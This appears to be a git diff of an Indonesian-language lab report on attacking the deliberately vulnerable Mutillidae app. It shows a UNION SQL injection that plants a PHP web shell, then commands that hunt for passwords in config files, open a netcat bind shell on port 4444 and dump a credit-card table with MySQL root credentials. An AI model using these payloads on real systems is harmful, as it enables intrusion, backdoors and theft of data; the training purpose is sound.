@@ -15,12 +15,12 @@
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_8/inspect.png "Home page")
 2. Change Text Box Size
    - Pada bagian size, tambahkan kapasistasnya dari yg semula 20 menjadi 100
-![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_8/inspect.png "Home page")
+![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_8/change_size.png "Home page")
 3. Second Union SQL Injection Attempt
    - Pada kolom textbox **Name** isikan 
-```
+   ```bash
 	' union select null,null,null,null,'<form action="" method="post" enctype="application/x-www-form-urlencoded"><input type="text" name="CMD" size="50"><input type="submit" value="Execute Command" /></form><?php echo "<pre>";echo shell_exec($_REQUEST["CMD"]);echo "</pre>"; ?>' INTO DUMPFILE '/var/www/html/mutillidae/execute_command.php' -- 
-```
+   ```
    - Pastikan anda menambahkan spasi setelah karakter **`--`**
    - Klik tombol View Account Details
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/union.png "Home page")
@@ -49,41 +49,41 @@
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/cat_passwd.png "Home page")
 4. Network Reconnaissance
    - Ketikkan perintah berikut pada textbox
-```
+   ```bash
    netstat -nao | grep "0.0.0.0:"
-```
+   ```
    - Klik tombol Execute Command
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/netstat.png "Home page")
 
 ## Using the Backdoor for Database Reconnaissance
 1. Database Reconnaissance
    - Ketikkan perintah berikut pada textbox
-```
-   	find * -name "*.php" | xargs grep -i "password" | grep "="
-```
+   ```bash
+   find * -name "*.php" | xargs grep -i "password" | grep "="
+   ```
    - Klik tombol Execute Command
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/find.png "Home page")
 2. View Database Authentication Attributes
    - Ketikkan perintah berikut pada textbox
-```
+   ```bash
    cat config.inc | grep -v "<?php"
-```
+   ```
    - Klik tombol Execute Command
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/cat_config.png "Home page")
 
 ##  Using the Backdoor for Netcat Reconnaissance
 1. Netcat Reconnaissance
    - Ketikkan perintah berikut pada textbox
-```
+   ```bash
    which nc; netstat -nao | grep 4444 | wc -l
- ```
+   ```
    - Klik tombol Execute Command
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/which_nc.png "Home page")
 2. Execute Netcat
    - Ketikkan perintah berikut pada textbox
-```
+   ```bash
    mkfifo /tmp/pipe;sh /tmp/pipe | nc -l 4444 > /tmp/pipe
-```
+   ```
    - Klik tombol Execute Command
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/mkfifo.png "Home page")
 3. On BackTrack, Start up a "another" terminal window
@@ -96,11 +96,11 @@
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/terminal_nc.png "Home page")
 5. View Credit Card Information
    - Pada terminal ketikkan printah-perintah berikut :
-```
+   ```bash
    echo "show databases;" | mysql -uroot -psamurai
    echo "use nowasp; show tables;" | mysql -uroot -psamurai
    echo "select * from nowasp.credit_cards;" | mysql -uroot -psamurai
-```
+   ```
 ![alt text](https://github.com/luqmanahmads/laporan-pksj/blob/master/assets/lesson_10/terminal_data.png "Home page")
 
 ## Note
